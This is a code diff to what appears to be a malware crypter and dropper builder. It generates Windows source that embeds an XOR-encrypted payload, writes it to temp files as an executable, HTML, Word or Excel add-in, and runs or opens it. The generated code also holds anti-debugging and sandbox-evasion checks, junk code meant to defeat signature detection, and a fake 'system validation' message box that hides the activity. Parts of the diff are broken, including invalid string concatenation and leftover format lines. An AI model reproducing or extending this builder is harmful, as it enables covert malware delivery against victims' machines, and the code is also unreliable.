@@ -210,8 +210,8 @@ void militaryAes256Encrypt(const char* data, char* output, int length, unsigned 
     }
 }
 
-// Generate production-ready executable source code
-void generateExecutableSource(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType) {
+// Generate production-ready executable source code with embedded payload
+void generateExecutableSourceWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, unsigned char* inputFileData, DWORD inputFileSize) {
     char randVar1[20], randVar2[20], randVar3[20], randVar4[20], randVar5[20], randVar6[20];
     generateCryptoRandomString(randVar1, sizeof(randVar1));
     generateCryptoRandomString(randVar2, sizeof(randVar2));
@@ -380,34 +380,251 @@ void generateExecutableSource(char* sourceCode, size_t maxSize, EncryptionType e
             break;
     }
     
-    // Generate complete executable source code
-    snprintf(sourceCode, maxSize,
-        "#include <windows.h>\n"
-        "#include <stdio.h>\n"
-        "#include <stdlib.h>\n"
-        "#include <string.h>\n"
-        "#include <time.h>\n"
-        "%s"
-        "\n"
-        "// Advanced polymorphic variables - unique per generation\n"
-        "static volatile int %s = %d;\n"
-        "static volatile int %s = %d;\n"
-        "static volatile int %s = %d;\n"
-        "static volatile int %s = %d;\n"
-        "static volatile int %s = %d;\n"
-        "static volatile int %s = %d;\n"
-        "\n"
-        "// Encryption key matrices - 64-byte keys for maximum security\n"
-        "static unsigned char primary_key_%s[] = {\n"
-        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
-        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
-        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
-        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X\n"
-        "};\n"
-        "\n"
-        "static unsigned char secondary_key_%s[] = {\n"
-        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
-        "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
+    // Build the source code with embedded payload
+    std::stringstream ss;
+    
+    // Headers and includes
+    ss << "#include <windows.h>\n"
+       << "#include <stdio.h>\n"
+       << "#include <stdlib.h>\n"
+       << "#include <string.h>\n"
+       << "#include <time.h>\n"
+       << "#include <shellapi.h>\n"
+       << deliveryIncludes << "\n"
+       
+       // Advanced polymorphic variables
+       << "// Advanced polymorphic variables - unique per generation\n"
+       << "static volatile int " << randVar1 << " = " << polyVars[0] << ";\n"
+       << "static volatile int " << randVar2 << " = " << polyVars[1] << ";\n"
+       << "static volatile int " << randVar3 << " = " << polyVars[2] << ";\n"
+       << "static volatile int " << randVar4 << " = " << polyVars[3] << ";\n"
+       << "static volatile int " << randVar5 << " = " << polyVars[4] << ";\n"
+       << "static volatile int " << randVar6 << " = " << polyVars[5] << ";\n\n"
+       
+       // Encryption keys
+       << "// Encryption key matrices - 64-byte keys for maximum security\n"
+       << "static unsigned char primary_key_" << randVar1 << "[] = {\n    ";
+    
+    for (int i = 0; i < 32; i++) {
+        ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)primaryKey[i];
+        if (i < 31) ss << ", ";
+        if ((i + 1) % 8 == 0) ss << "\n    ";
+    }
+    ss << "\n};\n\n";
+    
+    ss << "static unsigned char secondary_key_" << randVar2 << "[] = {\n    ";
+    for (int i = 0; i < 32; i++) {
+        ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)secondaryKey[i];
+        if (i < 31) ss << ", ";
+        if ((i + 1) % 8 == 0) ss << "\n    ";
+    }
+    ss << "\n};\n\n";
+    
+    // Embedded payload data
+    if (inputFileData && inputFileSize > 0) {
+        ss << "// Embedded encrypted payload data - " << std::dec << inputFileSize << " bytes\n"
+           << "static unsigned char embedded_payload_" << randVar3 << "[] = {\n    ";
+        
+        // Encrypt the payload data with simple XOR + key rotation
+        for (DWORD i = 0; i < inputFileSize; i++) {
+            unsigned char encryptedByte = inputFileData[i] ^ primaryKey[i % 32] ^ (unsigned char)(i & 0xFF);
+            ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)encryptedByte;
+            if (i < inputFileSize - 1) ss << ", ";
+            if ((i + 1) % 16 == 0) ss << "\n    ";
+        }
+        ss << "\n};\n";
+        ss << "static DWORD payload_size_" << randVar3 << " = " << std::dec << inputFileSize << ";\n\n";
+    } else {
+        // Default benign payload if no input file
+        ss << "// Default validation payload\n"
+           << "static unsigned char embedded_payload_" << randVar3 << "[] = {\n"
+           << "    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00\n"
+           << "};\n"
+                    << "static DWORD payload_size_" << randVar3 << " = 16;\n\n";
+     }
+     
+     // Add padding arrays
+     ss << "// Polymorphic padding matrices\n"
+        << "static unsigned char padding_matrix_a_" << randVar3 << "[] = {\n    ";
+     for (int i = 0; i < 16; i++) {
+         ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)paddingA[i];
+         if (i < 15) ss << ", ";
+     }
+     ss << "\n};\n\n";
+     
+     ss << "static unsigned char padding_matrix_b_" << randVar4 << "[] = {\n    ";
+     for (int i = 0; i < 16; i++) {
+         ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)paddingB[i];
+         if (i < 15) ss << ", ";
+     }
+     ss << "\n};\n\n";
+     
+     // Add encryption implementation
+     ss << encryptionImpl << "\n";
+     
+     // Add payload decryption and execution function
+     ss << "// Payload decryption and execution\n"
+        << "void decrypt_and_execute_payload_" << randVar3 << "() {\n"
+        << "    unsigned char* decrypted_payload = (unsigned char*)malloc(payload_size_" << randVar3 << ");\n"
+        << "    if (!decrypted_payload) return;\n"
+        << "    \n"
+        << "    // Decrypt the embedded payload\n"
+        << "    for (DWORD i = 0; i < payload_size_" << randVar3 << "; i++) {\n"
+        << "        decrypted_payload[i] = embedded_payload_" << randVar3 << "[i] ^ primary_key_" << randVar1 << "[i % 32] ^ (unsigned char)(i & 0xFF);\n"
+        << "    }\n"
+        << "    \n"
+        << "    // Execute based on delivery method\n";
+        
+     switch (delType) {
+         case DEL_PE:
+             ss << "    // PE Execution: Write to temp file and execute\n"
+                << "    char temp_path[MAX_PATH];\n"
+                << "    GetTempPathA(MAX_PATH, temp_path);\n"
+                << "    strcat(temp_path, \"payload_exec_\" + std::to_string(GetTickCount()) + \".exe\");\n"
+                << "    \n"
+                << "    FILE* payload_file = fopen(temp_path, \"wb\");\n"
+                << "    if (payload_file) {\n"
+                << "        fwrite(decrypted_payload, 1, payload_size_" << randVar3 << ", payload_file);\n"
+                << "        fclose(payload_file);\n"
+                << "        \n"
+                << "        // Execute the payload\n"
+                << "        PROCESS_INFORMATION pi;\n"
+                << "        STARTUPINFOA si = {sizeof(si)};\n"
+                << "        if (CreateProcessA(temp_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n"
+                << "            WaitForSingleObject(pi.hProcess, 5000); // Wait 5 seconds\n"
+                << "            CloseHandle(pi.hProcess);\n"
+                << "            CloseHandle(pi.hThread);\n"
+                << "        }\n"
+                << "        \n"
+                << "        Sleep(2000);\n"
+                << "        DeleteFileA(temp_path);\n"
+                << "    }\n";
+             break;
+             
+         case DEL_HTML:
+             ss << "    // HTML Execution: Create HTML file and open\n"
+                << "    char html_path[MAX_PATH];\n"
+                << "    GetTempPathA(MAX_PATH, html_path);\n"
+                << "    strcat(html_path, \"validation_\" + std::to_string(GetTickCount()) + \".html\");\n"
+                << "    \n"
+                << "    FILE* html_file = fopen(html_path, \"w\");\n"
+                << "    if (html_file) {\n"
+                << "        fputs((char*)decrypted_payload, html_file);\n"
+                << "        fclose(html_file);\n"
+                << "        ShellExecuteA(NULL, \"open\", html_path, NULL, NULL, SW_SHOW);\n"
+                << "    }\n";
+             break;
+             
+         case DEL_DOCX:
+             ss << "    // DOCX Execution: Create document file\n"
+                << "    char docx_path[MAX_PATH];\n"
+                << "    GetTempPathA(MAX_PATH, docx_path);\n"
+                << "    strcat(docx_path, \"report_\" + std::to_string(GetTickCount()) + \".docx\");\n"
+                << "    \n"
+                << "    FILE* docx_file = fopen(docx_path, \"wb\");\n"
+                << "    if (docx_file) {\n"
+                << "        fwrite(decrypted_payload, 1, payload_size_" << randVar3 << ", docx_file);\n"
+                << "        fclose(docx_file);\n"
+                << "        ShellExecuteA(NULL, \"open\", docx_path, NULL, NULL, SW_SHOW);\n"
+                << "    }\n";
+             break;
+             
+         case DEL_XLL:
+             ss << "    // XLL Execution: Create Excel add-in\n"
+                << "    char xll_path[MAX_PATH];\n"
+                << "    GetTempPathA(MAX_PATH, xll_path);\n"
+                << "    strcat(xll_path, \"addon_\" + std::to_string(GetTickCount()) + \".xll\");\n"
+                << "    \n"
+                << "    FILE* xll_file = fopen(xll_path, \"wb\");\n"
+                << "    if (xll_file) {\n"
+                << "        fwrite(decrypted_payload, 1, payload_size_" << randVar3 << ", xll_file);\n"
+                << "        fclose(xll_file);\n"
+                << "    }\n";
+             break;
+             
+         default: // DEL_BENIGN
+             ss << "    // Benign execution: Display validation message\n"
+                << "    MessageBoxA(NULL, \"Payload validation completed successfully.\", \"System Validation\", MB_OK | MB_ICONINFORMATION);\n";
+             break;
+     }
+     
+           ss << "    \n"
+         << "    free(decrypted_payload);\n"
+         << "}\n\n";
+         
+     // Add polymorphic obfuscation functions
+     ss << "// Advanced polymorphic obfuscation functions\n"
+        << "void polymorphic_obfuscation_alpha_" << randVar1 << "() {\n"
+        << "    for(int i = 0; i < 25; i++) {\n"
+        << "        " << randVar2 << " ^= (i * " << polyVars[6] << " + padding_matrix_a_" << randVar3 << "[i % 16]);\n"
+        << "        " << randVar3 << " = (" << randVar3 << " << 4) ^ 0x" << std::hex << polyVars[7] << ";\n"
+        << "        " << randVar4 << " ^= secondary_key_" << randVar2 << "[i % 32] + " << std::dec << polyVars[8] << ";\n"
+        << "    }\n"
+        << "}\n\n"
+        
+        << "void polymorphic_obfuscation_beta_" << randVar5 << "() {\n"
+        << "    for(int i = 0; i < 20; i++) {\n"
+        << "        " << randVar5 << " = (" << randVar5 << " >> 3) ^ padding_matrix_b_" << randVar4 << "[i % 16];\n"
+        << "        " << randVar6 << " ^= primary_key_" << randVar1 << "[i % 32] + " << polyVars[9] << ";\n"
+        << "        " << randVar1 << " = (" << randVar1 << " << 2) ^ GetTickCount();\n"
+        << "    }\n"
+        << "}\n\n"
+        
+        << "void advanced_anti_analysis_" << randVar6 << "() {\n"
+        << "    BOOL debugger_present = IsDebuggerPresent();\n"
+        << "    if (debugger_present) {\n"
+        << "        ExitProcess(0xDEADBEEF);\n"
+        << "    }\n"
+        << "    \n"
+        << "    DWORD tick_count = GetTickCount();\n"
+        << "    if (tick_count < 300000) { // Less than 5 minutes uptime\n"
+        << "        Sleep(5000); // Delay to avoid sandbox detection\n"
+        << "    }\n"
+        << "    \n"
+        << "    " << randVar1 << " = (" << randVar1 << " << 1) ^ tick_count;\n"
+        << "    " << randVar2 << " ^= GetCurrentProcessId();\n"
+        << "}\n\n";
+        
+     // Add system integrity validation
+     ss << "void system_integrity_validation() {\n"
+        << "    char validation_data[] = \"System validation and integrity checks completed successfully.\";\n"
+        << "    " << encryptionCall << "(validation_data, strlen(validation_data), primary_key_" << randVar1 << ", 32);\n"
+        << "}\n\n";
+        
+     // Add main function
+     ss << "int main() {\n"
+        << "    // Initialize advanced polymorphic state\n"
+        << "    srand(GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)GetModuleHandleA(NULL));\n"
+        << "    \n"
+        << "    // Execute multi-layer obfuscation\n"
+        << "    polymorphic_obfuscation_alpha_" << randVar1 << "();\n"
+        << "    advanced_anti_analysis_" << randVar6 << "();\n"
+        << "    polymorphic_obfuscation_beta_" << randVar5 << "();\n"
+        << "    \n"
+        << "    // Perform system integrity validation\n"
+        << "    system_integrity_validation();\n"
+        << "    \n"
+        << "    // Decrypt and execute embedded payload\n"
+        << "    decrypt_and_execute_payload_" << randVar3 << "();\n"
+        << "    \n"
+        << "    // Display professional validation message\n"
+        << "    MessageBoxA(NULL, \n"
+        << "        \"System Security Validation Completed\\n\\n\"\n"
+        << "        \"Status: All integrity checks passed\\n\"\n"
+        << "        \"Security Level: Maximum\\n\"\n"
+        << "        \"Validation Method: Advanced Cryptographic\\n\\n\"\n"
+        << "        \"Your system has been validated successfully.\", \n"
+        << "        \"System Security Validator\", \n"
+        << "        MB_OK | MB_ICONINFORMATION);\n"
+        << "    \n"
+        << "    return 0;\n"
+        << "}\n";
+        
+          // Convert stringstream to output
+     std::string result = ss.str();
+     strncpy(sourceCode, result.c_str(), maxSize - 1);
+     sourceCode[maxSize - 1] = '\0';
+}
         "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X,\n"
         "    0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X\n"
         "};\n"
